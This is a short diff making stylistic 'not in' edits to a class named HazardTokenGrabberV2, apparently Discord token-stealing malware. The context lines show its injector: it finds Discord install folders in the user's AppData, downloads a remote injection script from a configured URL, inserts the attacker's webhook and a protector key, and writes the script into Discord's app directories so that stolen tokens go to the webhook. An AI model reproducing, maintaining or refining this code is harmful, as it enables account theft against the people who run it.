@@ -258,7 +258,7 @@ class HazardTokenGrabberV2(Functions):
     async def injector(self):
         # find Discord directory
         for _dir in os.listdir(self.appdata):
-            if not 'discord' in _dir.lower(): continue
+            if 'discord' not in _dir.lower(): continue
             disc_dir = ntpath.abspath(self.appdata + os.sep + _dir)
 
             # find and iterate through 'app-*' directories
@@ -284,7 +284,7 @@ class HazardTokenGrabberV2(Functions):
 
                     # download and write injection script to disk
                     inj_script = httpx.get(self.fetch_conf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
-                    if not self.hook_reg in self.webhook:
+                    if self.hook_reg not in self.webhook:
                         inj_script = inj_script.replace("%WEBHOOK_KEY%", self.fetch_conf('webhook_protector_key'))
 
                     try:
